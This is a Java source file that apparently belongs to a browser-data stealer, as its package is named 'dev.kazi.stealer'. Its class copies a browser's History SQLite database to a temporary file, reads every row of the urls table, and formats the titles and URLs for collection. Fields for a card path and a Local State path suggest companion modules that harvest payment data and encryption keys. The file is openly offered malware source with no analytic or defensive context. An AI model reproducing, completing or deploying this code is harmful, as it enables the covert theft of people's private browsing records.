package dev.kazi.stealer.utils.decrypt.history;

import java.sql.SQLException;
import java.sql.ResultSet;
import java.sql.Statement;
import java.sql.Connection;
import java.sql.DriverManager;
import java.nio.file.Files;
import java.nio.file.CopyOption;
import java.util.UUID;
import java.util.HashSet;
import java.util.ArrayList;
import java.util.List;
import java.io.File;

public class HistoryDecrypt {

    private File CARD_PATH;
    private File LOCAL_STATE_PATH;
    public List<String> HISTORIES;
    
    public HistoryDecrypt(final String path0, final String path1) {
        this.CARD_PATH = null;
        this.LOCAL_STATE_PATH = null;
        this.CARD_PATH = new File(path0);
        this.LOCAL_STATE_PATH = new File(path1);
        this.HISTORIES = new ArrayList<String>();
    }
    
    public String getData() {
        final StringBuilder temp = new StringBuilder();
        this.HISTORIES.forEach(history -> temp.append(history).append("\n"));
        return temp.toString();
    }
    
    public HistoryDecrypt getHistory() {
        final HashSet<History> HISTORIES = new HashSet<History>();
        Connection connection = null;
        File tempFile = null;
        try {
            tempFile = new File(UUID.randomUUID().toString());
            Files.copy(this.CARD_PATH.toPath(), tempFile.toPath(), new CopyOption[0]);
            Class.forName("org.sqlite.JDBC");
            connection = DriverManager.getConnection("jdbc:sqlite:" + tempFile.getAbsolutePath());
            final Statement statement = connection.createStatement();
            statement.setQueryTimeout(30);
            final ResultSet resultSet = statement.executeQuery("SELECT * FROM urls");
            while (resultSet.next()) {
                this.parseHistories(tempFile, "", HISTORIES, resultSet);
            }
        }
        catch (final Exception exception) {
            try {
                if (connection != null) {
                    connection.close();
                }
            }
            catch (final Exception exception2) {
                throw new RuntimeException(exception2);
            }
        }
        tempFile.delete();
        return this;
    }
    
    private void parseHistories(final File historyStore, final String name, final HashSet<History> historySet, final ResultSet resultSet) throws SQLException {
        final String urlsite = resultSet.getString(2);
        final String titlesite = resultSet.getString(3);
        if (urlsite != null) {
            final String format = "Title: " + titlesite + "\nURL: " + urlsite + "\n";
            this.HISTORIES.add(format);
        }
    }
}
